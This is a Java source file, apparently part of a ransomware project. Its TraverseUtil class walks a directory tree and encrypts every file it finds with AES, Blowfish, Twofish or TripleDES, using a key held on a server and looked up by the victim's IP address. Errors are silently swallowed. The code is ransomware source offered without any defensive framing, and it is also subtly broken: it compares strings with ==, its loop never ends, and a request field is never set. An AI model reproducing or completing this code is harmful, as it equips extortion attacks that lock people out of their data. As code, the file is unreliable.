package Agent.traversal;

import java.io.File;
import java.util.Collection;
import javax.inject.Inject;
import javax.servlet.http.HttpServletRequest;

import Agent.EncryptionAlgo.AES;
import Agent.EncryptionAlgo.Blowfish;
import Agent.EncryptionAlgo.CryptoUtil;
import Agent.EncryptionAlgo.TripleDES;
import Agent.EncryptionAlgo.Twofish;
import server.entities.CryptoKey;
import server.exceptions.AlgorithmNotFoundException;
import server.exceptions.RansomwareException;
import server.repositories.KeyRepository;

public abstract class TraverseUtil {

	@Inject
	private KeyRepository rep;
	private HttpServletRequest request;

	// Check if specific directory is already found in the folder tree
	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	public void encrypter(File file) throws RansomwareException {

		CryptoKey key = rep.findById(request.getRemoteAddr()).get();

		CryptoUtil crypto = null;
		switch (key.getAlgorithm()) {
		case "AES":
			crypto = new AES();
			break;
		case "Blowfish":
			crypto = new Blowfish();
			break;
		case "twofish":
			crypto = new Twofish();
			break;
		case "DESes":
			crypto = new TripleDES();
			break;

		}
		try {
			crypto.encrypt(key.getKey(), file);
		} catch (AlgorithmNotFoundException e) {
			throw new AlgorithmNotFoundException();

		}
	}

	public void sharedCode(String inputDir, Collection<File> dirs,Collection<File> structure) {
		
	
		structure.add(new File(inputDir));
		while (!(structure.isEmpty())) {
			/* get next file/directory */
			File current = (File) structure.iterator().next();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {
						try {

							if (!(isVisitedFolder(file, dirs))) {

								dirs.add(file);

							}
						} catch (NullPointerException e) {
						}
						structure.add(file);

					} else if (file.isFile()) {

						try {
							encrypter(file);
						} catch (RansomwareException e) {

						}
					}

				}
			}

		}
	}

	public abstract void traverseAndEncrypt(String inputDir, Collection<File> dirs);
}
